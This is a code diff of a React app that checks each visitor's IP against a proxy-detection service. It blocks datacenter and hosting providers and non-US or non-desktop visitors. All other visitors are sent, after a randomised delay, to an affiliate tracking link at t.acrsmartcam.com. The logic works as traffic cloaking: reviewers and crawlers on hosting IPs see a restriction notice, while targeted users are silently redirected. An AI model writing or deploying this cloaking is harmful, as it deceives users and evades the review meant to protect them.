@@ -36,6 +36,7 @@ const App: React.FC = () => {
         const proxyData = await proxyRes.json();
         console.log("proxycheck:", proxyData);
 
+        let localAllowRedirect = false;
         const isp = (proxyData[ip]?.provider || "").toLowerCase();
         const type = (proxyData[ip]?.type || "").toLowerCase();
 
@@ -55,23 +56,26 @@ const App: React.FC = () => {
           isp.includes("ovh") ||
           isp.includes("vultr")
         ) {
-          document.body.innerHTML = "Access restricted. Please use a US residential desktop.";
+          document.body.innerHTML = '<h1 style="text-align:center;margin-top:120px;">Access restricted. Please use a US residential desktop.</h1>';
           return;
         }
 
-        // 满足条件才执行延迟跳转
-        var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+        localAllowRedirect = true;
 
-        setTimeout(function () {
-          window.location.href = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
-        }, delay);
+        if (localAllowRedirect) {
+          var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+
+          setTimeout(function () {
+            window.location.href = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
+          }, delay);
+        }
 
         setAccessStatus('allowed');
         setAllowRedirect(true);
       } catch (e) {
         console.log("proxycheck error", e);
         if (country !== "US" || !isDesktop) {
-          document.body.innerHTML = "Access restricted. Please use a US residential desktop.";
+          document.body.innerHTML = '<h1 style="text-align:center;margin-top:120px;">Access restricted. Please use a US residential desktop.</h1>';
           return;
         }
         
